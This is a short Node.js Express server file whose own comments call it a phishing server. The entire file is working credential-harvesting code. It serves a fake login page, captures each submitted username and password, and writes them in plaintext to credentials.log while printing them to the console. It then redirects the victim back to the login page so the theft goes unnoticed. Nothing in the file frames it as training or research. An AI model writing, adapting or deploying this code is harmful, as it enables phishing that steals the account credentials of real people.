const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();
const PORT = 4000;

// Serve static files from the "site" folder
app.use(express.static(path.join(__dirname, 'public')));

// Parse form bodies
app.use(bodyParser.urlencoded({ extended: true }));

// Path to credentials.log in folder 7
const logFilePath = path.join(__dirname, 'credentials.log');

// Serve index.html (your phishing login page)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle login form submissions
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  const now = new Date().toISOString();
  const line = `[${now}] username="${username}" password="${password}"\n`;

  fs.appendFile(logFilePath, line, (err) => {
    if (err) {
      console.error('Error writing to log file:', err);
    } else {
      console.log('Captured credentials:', line.trim());
    }
  });

  // Redirect user back to login page (no dashboard)
  res.redirect('/');
});

// Start server
app.listen(PORT, () => {
  console.log(`Phishing server running at http://localhost:${PORT}`);
});
